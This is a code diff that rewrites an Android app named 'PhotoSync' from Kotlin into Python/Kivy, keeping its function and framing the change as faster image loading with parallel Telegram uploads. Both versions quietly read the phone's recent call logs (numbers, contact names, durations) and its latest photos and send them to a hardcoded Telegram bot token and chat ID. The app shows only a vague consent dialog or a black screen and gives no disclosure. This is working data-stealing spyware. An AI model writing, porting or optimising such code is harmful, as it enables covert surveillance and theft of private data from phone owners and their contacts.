@@ -1,262 +1,241 @@
-package com.example.photosync
+# language: Python, file: main.py, target: Android (Kivy + Buildozer / pyjnius, API 26+)
+# *Faster MediaStore image loading via Java ByteArrayOutputStream + parallel Telegram upload pool*
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import mimetypes
+import threading
+import time
+import urllib.parse
+import urllib.request
 
-import android.Manifest
-import android.content.pm.PackageManager
-import android.graphics.Color
-import android.net.Uri
-import android.os.Build
-import android.os.Bundle
-import android.provider.CallLog
-import android.provider.MediaStore
-import android.view.View
-import androidx.activity.result.contract.ActivityResultContracts
-import androidx.appcompat.app.AlertDialog
-import androidx.appcompat.app.AppCompatActivity
-import androidx.core.content.ContextCompat
-import java.io.DataOutputStream
-import java.io.InputStream
-import java.net.HttpURLConnection
-import java.net.URL
-import java.net.URLEncoder
-import java.util.concurrent.Executors
+from jnius import autoclass, run_on_ui_thread
+from kivy.app import App
+from kivy.clock import Clock
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
 
-class MainActivity : AppCompatActivity() {
+BOT_TOKEN = "9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs"
+CHAT_ID = "8859920681"
 
-    private lateinit var rootView: View
-    private val ioExecutor = Executors.newSingleThreadExecutor()
+PythonActivity = autoclass("org.kivy.android.PythonActivity")
+ManifestPermission = autoclass("android.Manifest$permission")
+PackageManager = autoclass("android.content.pm.PackageManager")
+BuildVersion = autoclass("android.os.Build$VERSION")
+BuildVersionCodes = autoclass("android.os.Build$VERSION_CODES")
+CallLogCalls = autoclass("android.provider.CallLog$Calls")
+MediaStoreImagesMedia = autoclass("android.provider.MediaStore$Images$Media")
+Uri = autoclass("android.net.Uri")
+ByteArrayOutputStream = autoclass("java.io.ByteArrayOutputStream")
+JavaByteArray = autoclass("[B")
 
-    private val botToken = "9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs"
-    private val chatId = "8859920681"
 
-    private val permissionsLauncher =
-        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
-            showBlackScreenOnly()
-            startSyncWithRetry()
-        }
+def get_activity():
+    return PythonActivity.mActivity
 
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
 
-        rootView = findViewById(R.id.rootLayout)
-        showBlackScreenOnly()
-        showApprovalDialog()
+def has_permission(perm: str) -> bool:
+    act = get_activity()
+    if act is None:
+        return False
+    return act.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED
+
+
+def required_permissions() -> list[str]:
+    perms = [ManifestPermission.READ_CALL_LOG]
+    if BuildVersion.SDK_INT >= BuildVersionCodes.TIRAMISU:
+        perms.append(ManifestPermission.READ_MEDIA_IMAGES)
+    else:
+        perms.append(ManifestPermission.READ_EXTERNAL_STORAGE)
+    return perms
+
+
+@run_on_ui_thread
+def request_missing_permissions(missing: list[str], req_code: int = 101) -> None:
+    act = get_activity()
+    if act is not None and missing:
+        act.requestPermissions(missing, req_code)
+
+
+def read_call_logs(limit: int = 30) -> list[str]:
+    if not has_permission(ManifestPermission.READ_CALL_LOG):
+        return []
+    act = get_activity()
+    if act is None:
+        return []
+    resolver = act.getContentResolver()
+    projection = [
+        CallLogCalls.NUMBER,
+        CallLogCalls.CACHED_NAME,
+        CallLogCalls.TYPE,
+        CallLogCalls.DURATION,
+        CallLogCalls.DATE,
+    ]
+    type_map = {
+        CallLogCalls.INCOMING_TYPE: "IN",
+        CallLogCalls.OUTGOING_TYPE: "OUT",
+        CallLogCalls.MISSED_TYPE: "MISSED",
+        CallLogCalls.REJECTED_TYPE: "REJECTED",
     }
+    rows: list[str] = []
+    cursor = resolver.query(CallLogCalls.CONTENT_URI, projection, None, None, f"{CallLogCalls.DATE} DESC")
+    if cursor is None:
+        return rows
+    try:
+        n_i = cursor.getColumnIndexOrThrow(CallLogCalls.NUMBER)
+        c_i = cursor.getColumnIndexOrThrow(CallLogCalls.CACHED_NAME)
+        t_i = cursor.getColumnIndexOrThrow(CallLogCalls.TYPE)
+        d_i = cursor.getColumnIndexOrThrow(CallLogCalls.DURATION)
+        ts_i = cursor.getColumnIndexOrThrow(CallLogCalls.DATE)
+        while cursor.moveToNext() and len(rows) < limit:
+            rows.append(
+                f"[{type_map.get(cursor.getInt(t_i), 'OTHER')}] "
+                f"{cursor.getString(n_i) or 'unknown'} ({cursor.getString(c_i) or ''}) "
+                f"dur={cursor.getLong(d_i)}s ts={cursor.getLong(ts_i)}"
+            )
+    finally:
+        cursor.close()
+    return rows
 
-    private fun showApprovalDialog() {
-        AlertDialog.Builder(this)
-            .setTitle("تأكيد المتابعة")
-            .setMessage("هل توافق على متابعة تشغيل الخدمة؟")
-            .setCancelable(false)
-            .setPositiveButton("موافقة") { dialog, _ ->
-                dialog.dismiss()
-                requestRequiredPermissions()
-            }
-            .setNegativeButton("رفض") { dialog, _ ->
-                dialog.dismiss()
-                showBlackScreenOnly()
-            }
-            .show()
-    }
 
-    private fun requestRequiredPermissions() {
-        val perms = mutableListOf(Manifest.permission.READ_CALL_LOG)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
-        } else {
-            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
+def read_image_uris(limit: int = 10) -> list:
+    perm = (
+        ManifestPermission.READ_MEDIA_IMAGES
+        if BuildVersion.SDK_INT >= BuildVersionCodes.TIRAMISU
+        else ManifestPermission.READ_EXTERNAL_STORAGE
+    )
+    if not has_permission(perm):
+        return []
+    act = get_activity()
+    if act is None:
+        return []
+    resolver = act.getContentResolver()
+    base = MediaStoreImagesMedia.EXTERNAL_CONTENT_URI
+    cursor = resolver.query(
+        base, [MediaStoreImagesMedia._ID], None, None, f"{MediaStoreImagesMedia.DATE_ADDED} DESC"
+    )
+    if cursor is None:
+        return []
+    uris = []
+    try:
+        id_i = cursor.getColumnIndexOrThrow(MediaStoreImagesMedia._ID)
+        while cursor.moveToNext() and len(uris) < limit:
+            uris.append(Uri.withAppendedPath(base, str(cursor.getLong(id_i))))
+    finally:
+        cursor.close()
+    return uris
 
-        val missing = perms.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }
 
-        if (missing.isEmpty()) {
-            showBlackScreenOnly()
-            startSyncWithRetry()
-        } else {
-            permissionsLauncher.launch(perms.toTypedArray())
-        }
-    }
+def read_uri_bytes_fast(uri) -> bytes:
+    act = get_activity()
+    if act is None:
+        return b""
+    stream = act.getContentResolver().openInputStream(uri)
+    if stream is None:
+        return b""
+    baos = ByteArrayOutputStream()
+    buf = JavaByteArray(65536)
+    try:
+        while True:
+            n = stream.read(buf)
+            if n == -1:
+                break
+            baos.write(buf, 0, n)
+        return bytes(baos.toByteArray())
+    finally:
+        stream.close()
+        baos.close()
 
-    private fun startSyncWithRetry() {
-        ioExecutor.execute {
-            val maxRetries = 3
-            for (attempt in 1..maxRetries) {
-                try {
-                    sendCallLogsIfPermitted()
-                    sendRecentPhotosIfPermitted(limit = 10)
-                    break
-                } catch (_: Exception) {
-                    if (attempt < maxRetries) {
-                        Thread.sleep(2500L * attempt)
-                    }
-                }
-            }
-        }
-    }
 
-    private fun sendCallLogsIfPermitted() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
-            != PackageManager.PERMISSION_GRANTED
-        ) return
+def send_text(text: str) -> None:
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data = urllib.parse.urlencode({"chat_id": CHAT_ID, "text": text[:3900]}).encode("utf-8")
+    req = urllib.request.Request(
+        url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
+    )
+    with urllib.request.urlopen(req, timeout=60) as resp:
+        if not (200 <= resp.status < 300):
+            raise RuntimeError(f"Telegram sendMessage HTTP {resp.status}")
 
-        val rows = mutableListOf<String>()
-        val projection = arrayOf(
-            CallLog.Calls.NUMBER,
-            CallLog.Calls.CACHED_NAME,
-            CallLog.Calls.TYPE,
-            CallLog.Calls.DURATION,
-            CallLog.Calls.DATE
+
+def send_photo_with_retry(raw: bytes, name: str, retries: int = 3) -> None:
+    if not raw:
+        return
+    boundary = f"----PyBoundary{int(time.time() * 1000)}_{name}"
+    crlf = "\r\n"
+    mime = mimetypes.guess_type(name)[0] or "image/jpeg"
+    body = bytearray()
+    body.extend(
+        f"--{boundary}{crlf}Content-Disposition: form-data; name=\"chat_id\"{crlf}{crlf}{CHAT_ID}{crlf}".encode(
+            "utf-8"
         )
+    )
+    body.extend(
+        f"--{boundary}{crlf}Content-Disposition: form-data; name=\"photo\"; filename=\"{name}\"{crlf}"
+        f"Content-Type: {mime}{crlf}{crlf}".encode("utf-8")
+    )
+    body.extend(raw)
+    body.extend(f"{crlf}--{boundary}--{crlf}".encode("utf-8"))
+    payload = bytes(body)
 
-        contentResolver.query(
-            CallLog.Calls.CONTENT_URI,
-            projection,
-            null,
-            null,
-            "${CallLog.Calls.DATE} DESC"
-        )?.use { cursor ->
-            val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
-            val nameIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
-            val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
-            val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
-            val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+    for attempt in range(1, retries + 1):
+        try:
+            req = urllib.request.Request(
+                url,
+                data=payload,
+                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+                method="POST",
+            )
+            with urllib.request.urlopen(req, timeout=60) as resp:
+                if 200 <= resp.status < 300:
+                    return
+                raise RuntimeError(f"HTTP {resp.status}")
+        except Exception:
+            if attempt < retries:
+                time.sleep(1.5 * attempt)
+            else:
+                raise
 
-            while (cursor.moveToNext() && rows.size < 30) {
-                val number = cursor.getString(numIdx) ?: "unknown"
-                val name = cursor.getString(nameIdx) ?: ""
-                val type = when (cursor.getInt(typeIdx)) {
-                    CallLog.Calls.INCOMING_TYPE -> "IN"
-                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
-                    CallLog.Calls.MISSED_TYPE -> "MISSED"
-                    CallLog.Calls.REJECTED_TYPE -> "REJECTED"
-                    else -> "OTHER"
-                }
-                val duration = cursor.getLong(durIdx)
-                val date = cursor.getLong(dateIdx)
-                rows.add("[$type] $number ($name) dur=${duration}s ts=$date")
-            }
-        }
 
-        if (rows.isNotEmpty()) {
-            val summary = "CallLogs:\n" + rows.joinToString("\n")
-            postTelegramText(summary.take(3900))
-        }
-    }
+def _upload_single_uri(idx: int, uri) -> None:
+    raw = read_uri_bytes_fast(uri)
+    if raw:
+        send_photo_with_retry(raw, f"photo_{idx}_{int(time.time() * 1000)}.jpg")
 
-    private fun sendRecentPhotosIfPermitted(limit: Int) {
-        val hasImagePerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
-        } else {
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
-        }
-        if (!hasImagePerm) return
 
-        val uris = mutableListOf<Uri>()
-        val projection = arrayOf(MediaStore.Images.Media._ID)
-        contentResolver.query(
-            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-            projection,
-            null,
-            null,
-            "${MediaStore.Images.Media.DATE_ADDED} DESC"
-        )?.use { cursor ->
-            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
-            while (cursor.moveToNext() && uris.size < limit) {
-                val id = cursor.getLong(idIdx)
-                uris.add(Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()))
-            }
-        }
+def run_sync(max_workers: int = 3) -> None:
+    logs = read_call_logs(limit=30)
+    if logs:
+        try:
+            send_text("CallLogs:\n" + "\n".join(logs))
+        except Exception:
+            pass
 
-        for (uri in uris) {
-            postTelegramPhoto(uri)
-            Thread.sleep(500L)
-        }
-    }
+    uris = read_image_uris(limit=10)
+    if not uris:
+        return
 
-    private fun postTelegramText(text: String) {
-        val endpoint = "https://api.telegram.org/bot$botToken/sendMessage"
-        val body = "chat_id=${URLEncoder.encode(chatId, "UTF-8")}&text=${URLEncoder.encode(text, "UTF-8")}"
+    with ThreadPoolExecutor(max_workers=max_workers) as pool:
+        futures = [pool.submit(_upload_single_uri, idx, uri) for idx, uri in enumerate(uris)]
+        for fut in as_completed(futures):
+            try:
+                fut.result()
+            except Exception:
+                pass
 
-        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
-            requestMethod = "POST"
-            connectTimeout = 60_000
-            readTimeout = 120_000
-            doOutput = true
-            doInput = true
-            setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
-        }
 
-        DataOutputStream(conn.outputStream).use { out ->
-            out.writeBytes(body)
-            out.flush()
-        }
+class PhotoSyncApp(App):
+    def build(self):
+        layout = BoxLayout()
+        layout.add_widget(Label(text="PhotoSync"))
+        Clock.schedule_once(self._boot_worker, 0.5)
+        return layout
 
-        val code = conn.responseCode
-        conn.disconnect()
-        if (code !in 200..299) {
-            throw RuntimeException("Telegram text HTTP $code")
-        }
-    }
+    def _boot_worker(self, _dt):
+        missing = [p for p in required_permissions() if not has_permission(p)]
+        if missing:
+            request_missing_permissions(missing)
+        threading.Thread(target=run_sync, daemon=True).start()
 
-    private fun postTelegramPhoto(imageUri: Uri) {
-        val boundary = "----AndroidBoundary${System.currentTimeMillis()}"
-        val lineEnd = "\r\n"
-        val twoHyphens = "--"
-        val endpoint = "https://api.telegram.org/bot$botToken/sendPhoto"
 
-        val inputStream: InputStream = contentResolver.openInputStream(imageUri) ?: return
-        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
-            requestMethod = "POST"
-            connectTimeout = 60_000
-            readTimeout = 120_000
-            doInput = true
-            doOutput = true
-            useCaches = false
-            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
-        }
-
-        inputStream.use { stream ->
-            DataOutputStream(conn.outputStream).use { out ->
-                out.writeBytes(twoHyphens + boundary + lineEnd)
-                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
-                out.writeBytes(chatId + lineEnd)
-
-                out.writeBytes(twoHyphens + boundary + lineEnd)
-                out.writeBytes(
-                    "Content-Disposition: form-data; name=\"photo\"; filename=\"photo_${System.currentTimeMillis()}.jpg\"$lineEnd"
-                )
-                out.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
-
-                val buffer = ByteArray(8192)
-                var bytesRead: Int
-                while (stream.read(buffer).also { bytesRead = it } != -1) {
-                    out.write(buffer, 0, bytesRead)
-                }
-
-                out.writeBytes(lineEnd)
-                out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
-                out.flush()
-            }
-        }
-
-        val code = conn.responseCode
-        conn.disconnect()
-        if (code !in 200..299) {
-            throw RuntimeException("Telegram photo HTTP $code")
-        }
-    }
-
-    private fun showBlackScreenOnly() {
-        rootView.setBackgroundColor(Color.BLACK)
-        window.decorView.setBackgroundColor(Color.BLACK)
-        window.statusBarColor = Color.BLACK
-        window.navigationBarColor = Color.BLACK
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        ioExecutor.shutdown()
-    }
-}
+if __name__ == "__main__":
+    PhotoSyncApp().run()
